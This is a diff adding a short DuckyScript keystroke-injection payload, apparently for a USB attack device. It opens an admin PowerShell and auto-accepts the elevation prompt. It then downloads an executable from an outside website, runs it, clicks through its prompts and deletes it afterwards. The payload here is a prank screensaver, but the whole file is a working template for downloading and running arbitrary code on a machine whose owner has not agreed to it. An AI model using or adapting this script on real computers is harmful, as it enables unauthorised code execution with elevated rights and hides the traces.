@@ -1,0 +1,37 @@
+DELAY 1000
+WINDOWS d
+DELAY 450
+WINDOWS r
+DELAY 450
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 30
+ENTER
+DELAY 1200
+ALT y
+DELAY 1000
+REM ********* DOWNLOAD FILE **********
+STRING $url = "https://www.screensaversplanet.com/files/screensavers/dog-licking-screen.exe"
+ENTER
+STRING $output = "$env:USERPROFILE/downloads/screensaver.exe"
+ENTER
+REM download file
+STRING (New-Object System.Net.WebClient).DownloadFile($url, $output)
+ENTER
+DELAY 1000
+REM ************* RUN .exe ************
+STRING & $output
+ENTER
+DELAY 1200
+ALT y
+DELAY 100
+ENTER
+DELAY 3000
+STRING n
+DELAY 100
+ENTER
+REM ******** cleanup *******
+DELAY 500
+STRING del $output
+ENTER
+STRING exit
+ENTER
